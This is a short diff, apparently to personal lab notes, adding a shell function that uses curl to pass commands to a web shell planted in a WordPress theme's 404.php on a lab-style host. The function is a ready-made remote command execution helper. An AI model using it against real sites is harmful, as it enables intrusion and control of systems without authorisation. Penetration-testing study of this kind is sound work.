@@ -16,4 +16,6 @@ my_function(){
 }
 ```
 
+Or this works:
 
+`my() { curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd="$1; }`
